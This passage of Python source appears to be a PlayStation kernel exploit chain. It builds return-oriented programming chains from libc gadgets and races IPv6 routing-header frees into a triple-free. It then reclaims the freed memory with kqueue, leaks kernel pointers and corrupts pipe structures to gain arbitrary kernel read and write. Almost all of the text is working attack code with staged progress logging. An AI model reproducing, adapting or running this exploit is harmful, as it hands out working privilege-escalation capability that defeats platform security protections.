    unroll = PERS_UNROLL
    log("[stage0] target=%d NW=%d unroll=%d (persistent workers)" %
        (target_total, NW, unroll))

    import offsets as _off

    def g(name):
        base = sc.libc_addr if name in _off.LIBC_GADGETS else sc.exec_addr
        return base + SELECTED_GADGETS[name]

    G_POP_RAX = g("pop rax; ret")
    G_POP_RDI = g("pop rdi; ret")
    G_POP_RSI = g("pop rsi; ret")
    G_POP_RDX = g("pop rdx; ret")
    G_POP_RCX = g("pop rcx; ret")
    G_POP_R8  = g("pop r8; ret")
    G_MOV_RSI_RAX = g("mov [rsi], rax; ret")
    G_RET = g("ret")
    G_PIVOT = g("mov rsp, [rdi + 0x38]; pop rdi; ret")
    if CONSOLE_KIND == "PS4":
        G_POP_R9 = g("pop r9; ret")
        G_MOV_R9 = None
    else:
        G_MOV_R9 = g("mov r9, [rax+rsi+0x18]; xor eax, eax; mov [r8], r9; ret")
        G_POP_R9 = None
    SYSW = sc.syscall_addr

    SC_KQ   = SYSCALL["kqueueex"]
    SC_READ = SYSCALL["read"]
    SC_CPUSET = SYSCALL["cpuset_setaffinity"]
    SC_THREXIT = SYSCALL["thr_exit"]
    POC_ARG = 0x800000000000
    EXIT_MARK = 0xDEAD

    r9c = alloc(0x20)
    for _i in range(0, 0x20, 8):
        r9c[_i:_i+8] = struct.pack("<Q", 0)
    R9_CONT = get_ref_addr(r9c)

    for nm, num in (("read", SC_READ), ("write", SYSCALL.get("write", 4)),
                    ("close", 6), ("pipe", 42), ("fcntl", 0x5C)):
        try:
            sc.make_syscall_if_needed(nm, num)
        except Exception:
            pass
    F_SETFL = 4
    O_NONBLOCK = 4

    def build_worker(core, rfd, finished_addr, dummybuf, pivot_cell,
                     unroll, remainder):
        SCRATCH = 0x4000
        per_block = 24
        n_slots = 256 + (2 + unroll + remainder) * per_block * 4
        size = SCRATCH + n_slots * 8 + 0x1000
        ba = alloc(size)
        for i in range(0, SCRATCH, 8):
            ba[i:i+8] = struct.pack("<Q", 0)
        base = get_ref_addr(ba)
        entry = base + SCRATCH
        max_slots = (size - SCRATCH) // 8 - 4

        mask = alloc(0x10)
        mask[0:8] = struct.pack("<Q", 1 << core)
        mask[8:16] = struct.pack("<Q", 0)

        slots = [0]
        record = []
        rec_on = [False]

        def emit(v):
            if slots[0] >= max_slots:
                raise Exception("worker chain overflow %d>=%d" %
                                (slots[0], max_slots))
            off = slots[0] * 8
            ba[SCRATCH + off:SCRATCH + off + 8] = struct.pack(
                "<Q", v & 0xFFFFFFFFFFFFFFFF)
            if rec_on[0]:
                record.append((slots[0], v & 0xFFFFFFFFFFFFFFFF))
            slots[0] += 1

        def at(i):
            return entry + i * 8

        def emit_syscall(num, rdi, rsi=0, rdx=0, rcx=0, r8=0):
            if CONSOLE_KIND == "PS4":
                emit(G_POP_R9); emit(R9_CONT)
                emit(G_POP_RAX); emit(num)
                emit(G_POP_RDI); emit(rdi)
                emit(G_POP_RSI); emit(rsi)
                emit(G_POP_RDX); emit(rdx)
                emit(G_POP_RCX); emit(rcx)
                emit(G_POP_R8);  emit(r8)
                emit(SYSW)
                emit(G_RET)
            else:
                emit(G_POP_RAX); emit(R9_CONT)
                emit(G_POP_RSI); emit(0)
                emit(G_POP_R8);  emit(R9_CONT)
                emit(G_MOV_R9)
                emit(G_POP_RAX); emit(num)
                emit(G_POP_RDI); emit(rdi)
                emit(G_POP_RSI); emit(rsi)
                emit(G_POP_RDX); emit(rdx)
                emit(G_POP_RCX); emit(rcx)
                emit(G_POP_R8);  emit(r8)
                emit(SYSW)
                emit(G_RET)

        def emit_kq_min():
            emit(G_POP_RAX); emit(SC_KQ)
            emit(G_POP_RDI); emit(POC_ARG)
            emit(SYSW)
            emit(G_RET)

        emit(G_RET); emit(G_RET)
        emit_syscall(SC_CPUSET, 3, 1, 0xFFFFFFFFFFFFFFFF, 0x10,
                     get_ref_addr(mask))
        emit(G_RET)
        emit(G_RET)
        loop_resume_idx = slots[0] - 1
        rec_on[0] = True
        emit_syscall(SC_READ, rfd, dummybuf, 1, 0, 0)
        for _ in range(unroll):
            emit_kq_min()
        rec_on[0] = False
        for (sidx, val) in record:
            emit(G_POP_RSI); emit(at(sidx))
            emit(G_POP_RAX); emit(val)
            emit(G_MOV_RSI_RAX)
        emit(G_POP_RSI); emit(finished_addr)
        emit(G_POP_RAX); emit(1)
        emit(G_MOV_RSI_RAX)
        emit(G_POP_RDI); emit(pivot_cell)
        emit(G_PIVOT)
        emit(G_RET)
        exit_resume_idx = slots[0] - 1
        for _ in range(remainder):
            emit_kq_min()
        emit(G_POP_RSI); emit(finished_addr)
        emit(G_POP_RAX); emit(EXIT_MARK)
        emit(G_MOV_RSI_RAX)
        emit_syscall(SC_THREXIT, 0, 0, 0, 0, 0)

        return {"ba": ba, "entry": entry, "mask": mask,
                "loop_resume_addr": at(loop_resume_idx),
                "exit_resume_addr": at(exit_resume_idx),
                "slots_used": slots[0]}

    _init_raw_prim_thread()

    def spawn(entry_addr):
        jb = alloc(0x60)
        scratch = alloc(0x100)
        for i in range(0, 0x100, 8):
            scratch[i:i+8] = struct.pack("<Q", 0)
        sa = get_ref_addr(scratch)
        for i in range(0, 0x60, 8):
            jb[i:i+8] = struct.pack("<Q", sa)
        jb[0x0:0x8] = struct.pack("<Q", sc.exec_addr + SELECTED_GADGETS["ret"])
        jb[0x10:0x18] = struct.pack("<Q", entry_addr)
        jb[0x40:0x44] = struct.pack("<I", _RAW_PRIM_INIT["fpu_ctrl"])
        jb[0x44:0x48] = struct.pack("<I", _RAW_PRIM_INIT["mxcsr"])
        thr_handle = alloc(8)
        longjmp_addr = sc.libc_addr + SELECTED_LIBC["longjmp"]
        ret = u64_to_i64(sc.functions.Thrd_create(
            thr_handle, longjmp_addr, get_ref_addr(jb)))
        if ret != 0:
            raise Exception("Thrd_create leak worker fail rc=%d" % ret)
        return (jb, scratch, thr_handle)

    U = unroll
    base_share = target_total // NW
    extra0 = target_total - base_share * NW
    refs = []
    workers = []
    for w in range(NW):
        target_w = base_share + (extra0 if w == 0 else 0)
        bplus1_w = target_w // U
        normal_w = bplus1_w - 1
        remainder_w = target_w - bplus1_w * U
        if normal_w < 0:
            normal_w = 0
        pipebuf = alloc(8)
        sc.syscalls.pipe(pipebuf)
        rfd = struct.unpack("<I", bytes(pipebuf[0:4]))[0]
        wfd = struct.unpack("<I", bytes(pipebuf[4:8]))[0]
        try:
            sc.syscalls.fcntl(wfd, F_SETFL, O_NONBLOCK)
        except Exception:
            pass
        finished = alloc(8); finished[0:8] = struct.pack("<Q", 0)
        dummybuf = alloc(8)
        pivot_cell = alloc(0x40)
        wc = build_worker(LEAK_CORES[w], rfd, get_ref_addr(finished),
                          get_ref_addr(dummybuf), get_ref_addr(pivot_cell),
                          U, remainder_w)
        pivot_cell[0x38:0x40] = struct.pack("<Q", wc["loop_resume_addr"])
        spawned = spawn(wc["entry"])
        refs.append((wc, finished, dummybuf, pivot_cell, pipebuf, spawned))
        workers.append({"wc": wc, "finished": finished, "rfd": rfd, "wfd": wfd,
                        "pivot_cell": pivot_cell, "normal": normal_w,
                        "queued": 0, "target": target_w, "rem": remainder_w})
        log("[stage0] worker %d core=%d target=%d normal=%d rem=%d slots=%d"
            % (w, LEAK_CORES[w], target_w, normal_w, remainder_w,
               wc["slots_used"]))
    _eta_rate = 1.65e6 if NW >= 4 else (1.39e6 if NW == 3 else NW * 0.45e6)
    log("[stage0] %d persistent workers spawned. ETA ~%dm" %
        (NW, int(target_total / _eta_rate / 60) + 1))

    FEED_CHUNK = 4096
    chunk = alloc(FEED_CHUNK)
    t0 = time.time()
    _last_log = [time.time()]
    all_fed = False
    while not all_fed:
        all_fed = True
        for wk in workers:
            if wk["queued"] < wk["normal"]:
                all_fed = False
                want = min(FEED_CHUNK, wk["normal"] - wk["queued"])
                n = u64_to_i64(sc.syscalls.write(wk["wfd"], chunk, want))
                if 0 < n <= FEED_CHUNK:
                    wk["queued"] += n
        if time.time() - _last_log[0] > 60.0:
            tot_q = sum(wk["queued"] for wk in workers)
            tot_n = sum(wk["normal"] for wk in workers)
            _buf = NW * 65536
            _consumed = tot_q - _buf
            if _consumed < 0:
                _consumed = 0
            _denom = tot_n if tot_n > 0 else 1
            _pct = 100.0 * _consumed / _denom
            if _pct > 99.0:
                _pct = 99.0
            el = time.time() - t0
            log("[stage0] leak ~%.0f%% elapsed %dm%02ds" %
                (_pct, int(el // 60), int(el % 60)))
            _last_log[0] = time.time()
        nanosleep_ms(200)
    log("[stage0] leak ~88%% (wake-bytes queued, finishing backlog...)")

    _drain_t0 = time.time()
    _backlog_kq = float(NW * 65536 * U)
    _drain_eta = _backlog_kq / _eta_rate if _eta_rate > 0 else 1.0
    if _drain_eta < 1.0:
        _drain_eta = 1.0
    _last_drain_log = [time.time()]
    for wk in workers:
        while True:
            wk["finished"][0:8] = struct.pack("<Q", 0)
            yieldable_sleep_ms(1500)
            if struct.unpack("<Q", bytes(wk["finished"][0:8]))[0] == 0:
                break
            if time.time() - _last_drain_log[0] > 30.0:
                _frac = (time.time() - _drain_t0) / _drain_eta
                if _frac > 1.0:
                    _frac = 1.0
                _dp = 88.0 + 11.0 * _frac
                _el = time.time() - t0
                log("[stage0] leak ~%.0f%% elapsed %dm%02ds" %
                    (_dp, int(_el // 60), int(_el % 60)))
                _last_drain_log[0] = time.time()
    log("[stage0] leak ~100%% - drain complete, finalizing")

    for wk in workers:
        wk["pivot_cell"][0x38:0x40] = struct.pack(
            "<Q", wk["wc"]["exit_resume_addr"])
        wk["finished"][0:8] = struct.pack("<Q", 0)
        sc.syscalls.write(wk["wfd"], chunk, 1)
    for wk in workers:
        dl = time.time() + 30.0
        while time.time() < dl:
            if struct.unpack("<Q", bytes(wk["finished"][0:8]))[0] == EXIT_MARK:
                break
            nanosleep_ms(50)
        got = struct.unpack("<Q", bytes(wk["finished"][0:8]))[0]
        if got != EXIT_MARK:
            log("[stage0] WARN: worker did not EXIT (finished=0x%x)" % got)
        try:
            sc.syscalls.close(wk["rfd"])
            sc.syscalls.close(wk["wfd"])
        except Exception:
            pass

    el = time.time() - t0
    log("[stage0] LEAK DONE: %d kq in %dm%02ds (~%.2fM/s) - %d spawns total"
        % (target_total, int(el // 60), int(el % 60),
           target_total / el / 1e6 if el > 0 else 0, NW))
    return target_total


def free_one_fd(S):
    if S.free_fd_idx >= len(S.free_fds):
        raise Exception(
            "free_one_fd: pool exhausted (idx=%d / len=%d)" %
            (S.free_fd_idx, len(S.free_fds)))
    fd = S.free_fds[S.free_fd_idx]
    sc.syscalls.close(fd)
    S.free_fd_idx += 1


def flush_iov_workers(S, count):
    for _ in range(count):
        S.iov_ws.signal()
        sc.syscalls.write(S.iov_sock_b, S.scratch_big, 1)
        S.iov_ws.wait()
        sc.syscalls.read(S.iov_sock_a, S.dummy_byte, 1)


def find_triplet(S, master_idx, exclude_idx, max_rounds):
    for round_ in range(1, max_rounds + 1):
        for i in range(S.ipv6_count):
            if i == master_idx or i == exclude_idx:
                continue
            S.rthdr_spray[4:8] = struct.pack("<I", RTHDR_TAG + i)
            _rthdr_set_at(S, i)
        v = _rthdr_get_tag_at(S, master_idx)
        if v is not None:
            j = v & 0xFFFF
            if ((v & 0xFFFF0000) == RTHDR_TAG and
                j != master_idx and j != exclude_idx and
                j < S.ipv6_count):
                return j
        if round_ % 100 == 0:
            sc.syscalls.sched_yield()
    return -1


def attempt_race_sequential(S):
    for i in range(S.ipv6_count):
        free_rthdr(S.ipv6_sockets[i])

    free_one_fd(S)

    flush_iov_workers(S, 32)

    free_one_fd(S)

    twins = find_twins(S, max_rounds=MAX_ROUNDS_TWIN)
    if twins is None:
        return None

    free_rthdr(S.ipv6_sockets[twins[1]])
    sched_yield_n(2)

    verify_buf = alloc(UCRED_SIZE)
    verify_len = alloc(4)
    reclaimed = False
    for _k in range(MAX_ROUNDS_TRIPLET):
        S.iov_ws.signal()
        sched_yield_n(4)
        verify_len[0:4] = struct.pack("<I", 8)
        sc.syscalls.getsockopt(
            S.ipv6_sockets[twins[0]],
            IPPROTO_IPV6, IPV6_RTHDR, verify_buf, verify_len,
        )
        if struct.unpack("<I", bytes(verify_buf[0:4]))[0] == 1:
            reclaimed = True
            break
        sc.syscalls.write(S.iov_sock_b, S.scratch_big, 1)
        S.iov_ws.wait()
        sc.syscalls.read(S.iov_sock_a, S.dummy_byte, 1)
    if not reclaimed:
        return None

    S.triplets[0] = twins[0]
    free_one_fd(S)
    sc.syscalls.sched_yield()

    S.triplets[1] = find_triplet(S, S.triplets[0], -1, MAX_ROUNDS_TRIPLET)
    if S.triplets[1] == -1:
        return None
    sc.syscalls.write(S.iov_sock_b, S.scratch_big, 1)
    S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], MAX_ROUNDS_TRIPLET)
    S.iov_ws.wait()
    sc.syscalls.read(S.iov_sock_a, S.dummy_byte, 1)
    if S.triplets[2] == -1:
        return None

    return {"triplets": [S.triplets[0], S.triplets[1], S.triplets[2]]}


def stage1(S, max_attempts=TRIPLEFREE_ATTEMPTS):
    if len(S.free_fds) < 3:
        log("[stage1] FATAL: only %d free_fds, need >= 3 per attempt" %
            len(S.free_fds))
        return False


    log("[stage1] starting attempt_race loop (max %d attempts, "
        "free_fds_pool=%d -> %d max iterations)" %
        (max_attempts, len(S.free_fds), len(S.free_fds) // 3))

    for attempt in range(max_attempts):
        t0 = time.time()
        result = attempt_race_sequential(S)
        dt = (time.time() - t0) * 1000.0

        if result is not None:
            triplets = result["triplets"]
            log("[stage1] *** TRIPLE-FREE LANDED *** attempt %d/%d  "
                "elapsed=%.1fms" % (attempt + 1, max_attempts, dt))
            log("[stage1]   triplets: %s" % str(triplets))
            log("[stage1]   free_fds consumed=%d / %d" %
                (S.free_fd_idx, len(S.free_fds)))
            log("[stage1]   SUCCESS - triple-free landed. Next: stage2.")
            return True

        log("[stage1] attempt %3d/%d: %.1fms NO ALIAS  free_fds_left=%d" %
            (attempt + 1, max_attempts, dt,
             len(S.free_fds) - S.free_fd_idx))

        if S.free_fd_idx + 3 > len(S.free_fds):
            log("[stage1] free_fds pool exhausted after %d attempts" %
                (attempt + 1))
            break

        nanosleep_ms(10)

    log("[stage1] leak failed (no triple-free landed) - please retry")
    return False


def stage2(S):
    log("[stage2] kqueue reclaim starting")
    sc.send_notification("Stage 2\nKqueue reclaim")

    free_rthdr(S.ipv6_sockets[S.triplets[1]])

    KQ_MAGIC = 0x1430000
    KQ_FDP_OFFSET = KOFF["KQ_FDP"]
    MAX_TRIES = 100000

    kq = -1
    proc_filedesc = 0
    for tries in range(MAX_TRIES):
        kq = u64_to_i64(sc.syscalls.kqueue())
        if kq < 0:
            raise Exception("stage2: kqueue() failed errno=%d" %
                            sc.syscalls.kqueue.errno)

        S.len_out[0:4] = struct.pack("<I", 256)
        rc = u64_to_i64(sc.syscalls.getsockopt(
            S.ipv6_sockets[S.triplets[0]], IPPROTO_IPV6, IPV6_RTHDR,
            S.rthdr_readback, S.len_out,
        ))
        if rc < 0:
            sc.syscalls.close(kq)
            continue

        magic = struct.unpack("<I", bytes(S.rthdr_readback[8:12]))[0]
        if magic == KQ_MAGIC:
            proc_filedesc = struct.unpack(
                "<Q",
                bytes(S.rthdr_readback[KQ_FDP_OFFSET:KQ_FDP_OFFSET + 8]),
            )[0]
            log("[stage2] kqueue reclaim landed after %d tries" %
                (tries + 1))
            break

        sc.syscalls.close(kq)
    else:
        raise Exception(
            "stage2: kqueue reclaim FAILED after %d tries" % MAX_TRIES)

    sc.syscalls.close(kq)
    S.proc_filedesc = proc_filedesc
    log("[stage2] proc_filedesc = 0x%x" % proc_filedesc)

    new_t1 = find_triplet(S, S.triplets[0], S.triplets[2], 50000)
    if new_t1 == -1:
        raise Exception("stage2: triplet repair FAILED")
    S.triplets[1] = new_t1
    log("[stage2] triplet repair: triplets[1] -> %d" % new_t1)

    log("[stage2] DONE: proc_filedesc=0x%x  triplets=[%d, %d, %d]" %
        (proc_filedesc, S.triplets[0], S.triplets[1], S.triplets[2]))
    return proc_filedesc


def triplets_valid(S):
    return (S.triplets[0] >= 0 and S.triplets[1] >= 0 and S.triplets[2] >= 0
            and S.triplets[1] < S.ipv6_count and S.triplets[2] < S.ipv6_count)


def repair_triplets(S):
    if S.triplets[1] < 0 or S.triplets[1] >= S.ipv6_count:
        for _ in range(5):
            S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2],
                                         FIND_TRIPLET_FAST)
            if S.triplets[1] != -1:
                break
            sc.syscalls.sched_yield()
            nanosleep_ms(10)
    if S.triplets[2] < 0 or S.triplets[2] >= S.ipv6_count:
        for _ in range(5):
            S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1],
                                         FIND_TRIPLET_FAST)
            if S.triplets[2] != -1:
                break
            sc.syscalls.sched_yield()
            nanosleep_ms(10)


def build_uio(buf, iov_ptr, td, is_read, kaddr, size):
    buf[0:8]   = struct.pack("<Q", iov_ptr)
    buf[8:16]  = struct.pack("<Q", UIO_IOV_COUNT)
    buf[16:24] = struct.pack("<Q", 0xFFFFFFFFFFFFFFFF)
    buf[24:32] = struct.pack("<Q", size)
    buf[32:36] = struct.pack("<I", UIO_SYSSPACE)
    buf[36:40] = struct.pack("<I", 1 if is_read else 0)
    buf[40:48] = struct.pack("<Q", td)
    buf[48:56] = struct.pack("<Q", kaddr)
    buf[56:64] = struct.pack("<Q", size)


def signal_uio(S, mode):
    S.active_uio_mode = mode
    if mode == 0:
        S.uio_read_ws.signal()
    else:
        S.uio_write_ws.signal()


def wait_uio(S):
    if S.active_uio_mode == 0:
        S.uio_read_ws.wait()
    else:
        S.uio_write_ws.wait()


def kread_slow(S, kaddr, size):
    if not triplets_valid(S):
        return None

    SOL_SOCKET_LOCAL = 0xFFFF
    SO_SNDBUF_LOCAL = 0x1001
    for i in range(0, 64, 8):
        S.uio_read_buf[i:i+8] = struct.pack("<Q", 0x4141414141414141)
    for i in range(UIO_THREAD_NUM):
        for j in range(size):
            S.kread_result_bufs[i][j:j+1] = b"\x00"

    S.kread_sndbuf[0:4] = struct.pack("<I", size)
    sc.syscalls.setsockopt(S.uio_sock_b, SOL_SOCKET_LOCAL, SO_SNDBUF_LOCAL,
                           S.kread_sndbuf, 4)
    sc.syscalls.write(S.uio_sock_b, S.scratch_big, size)
    S.uio_iov_read[8:16] = struct.pack("<Q", size)

    if not triplets_valid(S):
        return None
    free_rthdr(S.ipv6_sockets[S.triplets[1]])
    sched_yield_n(3)

    leaked_iov = 0
    found = False
    for _ in range(2000):
        signal_uio(S, 0)
        sc.syscalls.sched_yield()
        S.len_out[0:4] = struct.pack("<I", 16)
        sc.syscalls.getsockopt(
            S.ipv6_sockets[S.triplets[0]], IPPROTO_IPV6, IPV6_RTHDR,
            S.rthdr_readback, S.len_out)
        if struct.unpack("<I", bytes(S.rthdr_readback[8:12]))[0] == UIO_IOV_COUNT:
            found = True
            break
        sc.syscalls.read(S.uio_sock_a, S.scratch_big, size)
        for i in range(UIO_THREAD_NUM):
            sc.syscalls.read(S.uio_sock_a, S.kread_result_bufs[i], size)
        wait_uio(S)
        sc.syscalls.write(S.uio_sock_b, S.scratch_big, size)

    if not found:
        return None
    leaked_iov = struct.unpack("<Q", bytes(S.rthdr_readback[0:8]))[0]
    if leaked_iov == 0 or (leaked_iov >> 48) != 0xFFFF:
        return None

    build_uio(S.recvmsg_iovecs, leaked_iov, 0, True, kaddr, size)

    if not triplets_valid(S):
        return None
    free_rthdr(S.ipv6_sockets[S.triplets[2]])
    sched_yield_n(3)

    found = False
    for _ in range(2000):
        S.iov_ws.signal()
        sched_yield_n(5)
        S.len_out[0:4] = struct.pack("<I", 64)
        sc.syscalls.getsockopt(
            S.ipv6_sockets[S.triplets[0]], IPPROTO_IPV6, IPV6_RTHDR,
            S.rthdr_readback, S.len_out)
        if struct.unpack("<I", bytes(S.rthdr_readback[32:36]))[0] == UIO_SYSSPACE:
            found = True
            break
        sc.syscalls.write(S.iov_sock_b, S.scratch_big, 1)
        S.iov_ws.wait()
        sc.syscalls.read(S.iov_sock_a, S.dummy_byte, 1)

    if not found:
        return None

    sc.syscalls.read(S.uio_sock_a, S.scratch_big, size)
    result = None
    for i in range(UIO_THREAD_NUM):
        sc.syscalls.read(S.uio_sock_a, S.kread_result_bufs[i], size)
        v = struct.unpack("<Q", bytes(S.kread_result_bufs[i][0:8]))[0]
        if v != 0x4141414141414141:
            t = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST)
            if t == -1:
                wait_uio(S)
                sc.syscalls.write(S.iov_sock_b, S.scratch_big, 1)
                S.iov_ws.wait()
                sc.syscalls.read(S.iov_sock_a, S.dummy_byte, 1)
                S.triplets[1] = find_triplet(
                    S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST)
                return None
            S.triplets[1] = t
            result = S.kread_result_bufs[i]

    wait_uio(S)
    sc.syscalls.write(S.iov_sock_b, S.scratch_big, 1)
    if result is None:
        S.iov_ws.wait()
        sc.syscalls.read(S.iov_sock_a, S.dummy_byte, 1)
        return None

    for _ in range(5):
        S.triplets[2] = find_triplet(
            S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST)
        if S.triplets[2] != -1:
            break
        sc.syscalls.sched_yield()
    if S.triplets[2] == -1:
        S.iov_ws.wait()
        sc.syscalls.read(S.iov_sock_a, S.dummy_byte, 1)
        return None

    S.iov_ws.wait()
    sc.syscalls.read(S.iov_sock_a, S.dummy_byte, 1)
    return result


def kwrite_slow(S, kaddr, data_addr, data_size):
    if not triplets_valid(S):
        return False

    SOL_SOCKET_LOCAL = 0xFFFF
    SO_SNDBUF_LOCAL = 0x1001
    S.kwrite_sndbuf[0:4] = struct.pack("<I", data_size)
    sc.syscalls.setsockopt(S.uio_sock_b, SOL_SOCKET_LOCAL, SO_SNDBUF_LOCAL,
                           S.kwrite_sndbuf, 4)
    S.uio_iov_write[8:16] = struct.pack("<Q", data_size)

    if not triplets_valid(S):
        return False
    free_rthdr(S.ipv6_sockets[S.triplets[1]])
    sched_yield_n(3)

    leaked_iov = 0
    found = False
    for _ in range(2000):
        signal_uio(S, 1)
        sc.syscalls.sched_yield()
        S.len_out[0:4] = struct.pack("<I", 16)
        sc.syscalls.getsockopt(
            S.ipv6_sockets[S.triplets[0]], IPPROTO_IPV6, IPV6_RTHDR,
            S.rthdr_readback, S.len_out)
        if struct.unpack("<I", bytes(S.rthdr_readback[8:12]))[0] == UIO_IOV_COUNT:
            found = True
            break
        for i in range(UIO_THREAD_NUM):
            sc.syscalls.write(S.uio_sock_b, data_addr, data_size)
        wait_uio(S)

    if not found:
        return False
    leaked_iov = struct.unpack("<Q", bytes(S.rthdr_readback[0:8]))[0]
    if leaked_iov == 0 or (leaked_iov >> 48) != 0xFFFF:
        return False

    build_uio(S.recvmsg_iovecs, leaked_iov, 0, False, kaddr, data_size)
    if not triplets_valid(S):
        return False
    free_rthdr(S.ipv6_sockets[S.triplets[2]])
    sched_yield_n(3)

    found = False
    for _ in range(2000):
        S.iov_ws.signal()
        sched_yield_n(5)
        S.len_out[0:4] = struct.pack("<I", 64)
        sc.syscalls.getsockopt(
            S.ipv6_sockets[S.triplets[0]], IPPROTO_IPV6, IPV6_RTHDR,
            S.rthdr_readback, S.len_out)
        if struct.unpack("<I", bytes(S.rthdr_readback[32:36]))[0] == UIO_SYSSPACE:
            found = True
            break
        sc.syscalls.write(S.iov_sock_b, S.scratch_big, 1)
        S.iov_ws.wait()
        sc.syscalls.read(S.iov_sock_a, S.dummy_byte, 1)

    if not found:
        return False

    for _ in range(UIO_THREAD_NUM):
        sc.syscalls.write(S.uio_sock_b, data_addr, data_size)

    for _ in range(5):
        S.triplets[1] = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST)
        if S.triplets[1] != -1:
            break
        sc.syscalls.sched_yield()
    if S.triplets[1] == -1:
        return False

    wait_uio(S)
    sc.syscalls.write(S.iov_sock_b, S.scratch_big, 1)

    for _ in range(5):
        S.triplets[2] = find_triplet(
            S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST)
        if S.triplets[2] != -1:
            break
        sc.syscalls.sched_yield()
    if S.triplets[2] == -1:
        return False

    S.iov_ws.wait()
    sc.syscalls.read(S.iov_sock_a, S.dummy_byte, 1)
    return True


def kslow64(S, kaddr):
    for attempt in range(3):
        if triplets_valid(S):
            buf = kread_slow(S, kaddr, 8)
            if buf is not None:
                val = struct.unpack("<Q", bytes(buf[0:8]))[0]
                if val != 0:
                    if (val >> 48) == 0xFFFF:
                        return val
                    if (val >> 40) != 0:
                        return val
        repair_triplets(S)
        sc.syscalls.sched_yield()
    return None


def stage3(S):
    log("[stage3] leaking pipe data pointers")
    sc.send_notification("Stage 3\nLeak pipe pointers")

    repair_triplets(S)
    nanosleep_ms(100)

    fdescenttbl = kslow64(S, S.proc_filedesc + KOFF["FILEDESC_OFILES"])
    if not fdescenttbl:
        raise Exception("stage3: fdescenttbl read failed")
    S.fd_ofiles = fdescenttbl + KOFF["FDESCENTTBL_HDR"]
    log("[stage3] fd_ofiles=0x%x" % S.fd_ofiles)
    repair_triplets(S)
    nanosleep_ms(500)
    repair_triplets(S)

    master_fp = kslow64(
        S, S.fd_ofiles + S.master_rfd * KOFF["FILEDESCENT_SIZE"])
    if not master_fp:
        raise Exception("stage3: master_fp read failed")
    log("[stage3] master_fp=0x%x" % master_fp)
    repair_triplets(S)
    nanosleep_ms(500)
    repair_triplets(S)

    victim_fp = kslow64(
        S, S.fd_ofiles + S.victim_rfd * KOFF["FILEDESCENT_SIZE"])
    if not victim_fp:
        raise Exception("stage3: victim_fp read failed")
    log("[stage3] victim_fp=0x%x" % victim_fp)
    repair_triplets(S)
    nanosleep_ms(500)
    repair_triplets(S)

    S.master_pipe_data = kslow64(S, master_fp)
    if not S.master_pipe_data:
        raise Exception("stage3: master_pipe_data read failed")
    log("[stage3] master_pipe_data=0x%x" % S.master_pipe_data)
    repair_triplets(S)
    nanosleep_ms(500)
    repair_triplets(S)

    S.victim_pipe_data = kslow64(S, victim_fp)
    if not S.victim_pipe_data:
        raise Exception("stage3: victim_pipe_data read failed")
    log("[stage3] victim_pipe_data=0x%x" % S.victim_pipe_data)

    if S.master_pipe_data == S.victim_pipe_data:
        raise Exception(
            "stage3: master_pipe == victim_pipe (aliased - bad leak)")

    log("[stage3] DONE  master=0x%x  victim=0x%x" %
        (S.master_pipe_data, S.victim_pipe_data))


def stage4(S):
    log("[stage4] pipe corruption -> fast kernel R/W")
    sc.send_notification("Stage 4\nPipe corruption -> fast kernel R/W")

    pipe_overwrite = alloc(24)
    pipe_overwrite[0:4]   = struct.pack("<I", 0)
    pipe_overwrite[4:8]   = struct.pack("<I", 0)
    pipe_overwrite[8:12]  = struct.pack("<I", 0)
    pipe_overwrite[12:16] = struct.pack("<I", PAGE_SIZE)
    pipe_overwrite[16:24] = struct.pack("<Q", S.victim_pipe_data)

    nanosleep_ms(100)

    ok = False
    for attempt in range(40):
        repair_triplets(S)
        if kwrite_slow(S, S.master_pipe_data,
                       get_ref_addr(pipe_overwrite), 24):
            ok = True
            log("[stage4] kwrite_slow succeeded on attempt %d" % (attempt + 1))
            break
        nanosleep_ms(100)
        sc.syscalls.sched_yield()

    if not ok:
        raise Exception("stage4: kwrite_slow failed after 40 attempts")

    sc.syscalls.sched_yield()
    log("[stage4] DONE  fast kernel R/W primitive available")


def setup_fast_kernel_rw(S):
    pipe_cmd = alloc(24)

    def set_victim_pipe(cnt, inp, out, size, buf_addr):
        pipe_cmd[0:4]   = struct.pack("<I", cnt)
        pipe_cmd[4:8]   = struct.pack("<I", inp)
        pipe_cmd[8:12]  = struct.pack("<I", out)
        pipe_cmd[12:16] = struct.pack("<I", size)
        pipe_cmd[16:24] = struct.pack("<Q", buf_addr)
        sc.syscalls.write(S.master_wfd, pipe_cmd, 24)
        sc.syscalls.read(S.master_rfd, pipe_cmd, 24)

    def kread(buf, kaddr, size):
        set_victim_pipe(size, 0, 0, PAGE_SIZE, kaddr)
        return sc.syscalls.read(S.victim_rfd, buf, size)

    def kwrite(kaddr, buf, size):
        set_victim_pipe(0, 0, 0, PAGE_SIZE, kaddr)
        return sc.syscalls.write(S.victim_wfd, buf, size)

    for i in range(0, 64, 8):
        S.scratch_big[i:i+8] = struct.pack("<Q", 0)

    def kread8(k):
        kread(S.scratch_big, k, 1)
        return S.scratch_big[0]

    def kread32(k):
        kread(S.scratch_big, k, 4)
        return struct.unpack("<I", bytes(S.scratch_big[0:4]))[0]

    def kread64(k):
        kread(S.scratch_big, k, 8)
        return struct.unpack("<Q", bytes(S.scratch_big[0:8]))[0]

    def kwrite8(k, v):
        S.scratch_big[0:1] = struct.pack("<B", v & 0xFF)
        kwrite(k, S.scratch_big, 1)

    def kwrite32(k, v):
        S.scratch_big[0:4] = struct.pack("<I", v & 0xFFFFFFFF)
        kwrite(k, S.scratch_big, 4)

    def kwrite64(k, v):
        S.scratch_big[0:8] = struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)
        kwrite(k, S.scratch_big, 8)

    S.kread = kread
    S.kwrite = kwrite
    S.kread8 = kread8
    S.kread32 = kread32
    S.kread64 = kread64
    S.kwrite8 = kwrite8
    S.kwrite32 = kwrite32
    S.kwrite64 = kwrite64
    S._set_victim_pipe = set_victim_pipe

    verified = False
    for _ in range(3):
        if kread64(S.master_pipe_data + 0x10) == S.victim_pipe_data:
            verified = True
            break
        nanosleep_ms(100)
        repair_triplets(S)
    if not verified:
        raise Exception("setup_fast_kernel_rw: verify failed")
    log("[fast-rw] kernel R/W primitive verified")


def stage4b_cleanup(S):
    log("[stage4b] cleanup (luac0re-lua + shahril pattern)")
    sc.send_notification("Stage 4b\nCleanup race state")

